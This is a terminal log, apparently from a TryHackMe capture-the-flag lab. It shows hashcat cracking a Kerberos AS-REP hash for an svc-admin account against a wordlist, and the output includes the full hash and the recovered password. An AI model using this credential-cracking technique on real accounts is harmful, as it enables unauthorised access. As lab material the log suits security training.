
```sh
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ ls -la                                                             
total 1092
drwxrwxr-x  2 kali kali   4096 Jul  3 00:04 .
drwxr-xr-x 45 kali kali   4096 Jul  3 00:03 ..
-rw-r--r--  1 kali kali 569236 Jul  3 00:04 passwordlist.txt
-rw-r--r--  1 kali kali 540470 Jul  3 00:04 userlist.txt

┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ nano svc-admin.hash
```


```sh
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ hashcat svc-admin.hash passwordlist.txt                            
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-penryn-QEMU Virtual CPU version 2.5+, 5431/10927 MB (2048 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: passwordlist.txt
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:66ca4f25d28857dab71b6de84734f5ca$87c35934ab2a97011a39f4b3671f0ff97f1feaf2bc876f577b3b40967ad1012e24cac99efdde817db83216d2d3acdec1ac39920f9755b2e407f2eec4bca3dca5a5de969899afb3ec7dd225aba4d6a791e63b01581fc16e8c25c580d567aa3c1a8752ff7e9333150df02fd3c91b96279b125a50c3135ae39be7b22b15f91769c21c5484b710a040ea58b3fd85418d1222dca4342c60db2cf74c977b47d9b16bcf38d870a218f0ed06e44434dbd0fc1c1d93a5cd94a8272978cc02851b5d02fb186cacad4225d86cb8895123ec9253dd0c6c9947ab4aaab817a1a3f060841b442d9277e37803bc553aae620ff34f315f89fde6:management2005
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:66ca4f25d28...89fde6
Time.Started.....: Thu Jul  3 00:31:55 2025 (0 secs)
Time.Estimated...: Thu Jul  3 00:31:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    60038 H/s (2.72ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/70188 (11.67%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/70188 (5.84%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> whitey

Started: Thu Jul  3 00:31:06 2025
Stopped: Thu Jul  3 00:31:57 2025
```